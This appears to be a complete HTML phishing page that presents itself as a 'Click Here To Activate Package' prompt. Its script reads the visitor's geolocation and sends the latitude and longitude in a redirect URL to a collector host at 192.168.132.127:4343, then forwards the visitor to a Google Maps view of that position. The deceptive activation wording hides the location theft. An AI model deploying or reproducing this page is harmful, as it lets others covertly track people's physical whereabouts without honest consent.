<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Welcome </title>
  </head>
  <body>
    <center>
      <p><b>Click on the button below and allow the permission to Activate package</b></p>
    <button onclick="getLocation()" name="button">Click Here To Activate Package</button>
    <p id="demo"></p>

    <script type="text/javascript">
      var x = document.getElementById("demo") ;
      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, errorCallback, { timeout:5000 });

        } else {
          x.innerHTML = "Unsupported Browser or Please Update your Browser and Try again";

        }
      }
      function showPosition(position) {
        var latlong = x.innerHTML = "Latitude:"+ position.coords.latitude + "<br>Longitude:" + position.coords.longitude ;
        var lat = position.coords.latitude
        var lon = position.coords.longitude
        document.location='http://192.168.132.127:4343/'+latlong + 'https://www.google.co.in/maps/search/'+ lat +',' + lon + '/@'+ lat + ',' + lon + ',18z?hl=en'
        setTimeout(document.location='https://www.google.co.in/maps/search/'+ lat +',' + lon + '/@'+ lat + ',' + lon + ',18z?hl=en', 5000);
        
        
      }
      function errorCallback(error) {
        x.innerHTML = "failed";
      }

    </script>
    </center>
  </body>
</html>
